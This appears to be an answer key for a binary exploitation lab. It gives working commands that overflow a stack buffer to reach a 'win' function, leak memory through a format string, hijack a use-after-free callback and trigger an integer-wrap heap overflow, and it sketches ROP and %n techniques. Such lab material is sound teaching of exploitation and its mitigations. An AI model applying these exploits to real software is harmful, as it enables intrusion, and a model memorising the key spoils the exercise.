# Binary lab answers

## 1. Build differences

`stack-vuln` is `EXEC`, no canary, executable stack, no RELRO. `stack-hard` is `DYN` (PIE), has `__stack_chk_fail`, `GNU_RELRO` with `BIND_NOW`, and a non-executable stack.

## 2. Offset

```bash
python3 -c 'from pwn import *; print(cyclic(200).decode())' > /tmp/pat
gdb -q ./stack-vuln -ex 'run < /tmp/pat' -ex 'info registers rip'
python3 -c 'from pwn import *; print(cyclic_find(0x6161616c))'
```

The offset is 72 on this build: 64 bytes of buffer plus 8 bytes of saved RBP.

## 3. Redirect

```bash
ADDR=$(nm stack-vuln | awk '/ win$/{print $1}')
python3 -c "from pwn import *; print(flat({72: int('0x$ADDR',16)}).decode('latin1'))" | ./stack-vuln
```

`flag{stack_overflow_101}`. The build is non-PIE, so `win` is at a fixed address.

## 4. Hardened build

The canary sits between the buffer and the return address. A plain offset overwrites the canary and the check aborts with `*** stack smashing detected ***`. PIE also randomizes `win`. A leak or a partial overwrite is needed.

## 5. Format string

```bash
printf '%%p.%%p.%%p.%%p.%%p.%%p\n' | ./fmt
```

The input appears at a fixed argument position on the stack. Count from the first leak until you see `0x...` that matches the buffer bytes.

## 6. Secret

```bash
ADDR=$(nm fmt | awk '/ secret$/{print $1}')
printf "${ADDR}\n" | ./fmt
```

`%s` expects a pointer. Pass the address as a positional argument, for example `%7$s` after finding the position, or build a length-prefixed input that lands in the right slot.

## 7. UAF

```bash
ADDR=$(nm uaf | awk '/ win$/{print $1}')
python3 -c "import sys,struct;sys.stdout.buffer.write(struct.pack('<Q',0x$ADDR)+b'B'*24)" | ./uaf
```

`malloc(32)` returns the freed chunk, the first 8 bytes replace the callback, and the stale object calls `win`.

## 8. Integer wrap

```bash
python3 -c 'print("A"*2000)' | ./integer-asan 65536 65536
```

`65536 * 65536` is `2^32`, which truncates to 0. `malloc(1)` returns a 1-byte region. `fread` writes 2000 bytes into it. ASAN reports the 1-byte allocation.

## 9. Mitigations on `stack-hard`

PIE, stack canary, NX, and full RELRO. Check with:

```bash
checksec --file=stack-hard
readelf -h stack-hard | grep Type
readelf -l stack-hard | grep GNU_STACK
readelf -d stack-hard | grep BIND_NOW
```

## 10. Exploitability

With NX off and no PIE, a direct return to `win` is reliable. With NX on, you need a leak or a ROP chain. With the canary, you need a leak or a non-return target. With PIE, `win` needs a code base leak. The primitive is the same; each mitigation adds a step.

## Stretch notes

- ROP: `pop rdi; ret` plus a writable `/bin/sh` string, then `system@plt`. Full RELRO blocks GOT overwrite, so use the PLT stub.
- `%n`: pass the target address in the buffer and use positional `%hhn` writes.
- Heap overflow: add a struct after the buffer and overwrite its function pointer.
- `-fstack-protector-strong` adds a canary and turns task 3 into a canary bypass exercise.
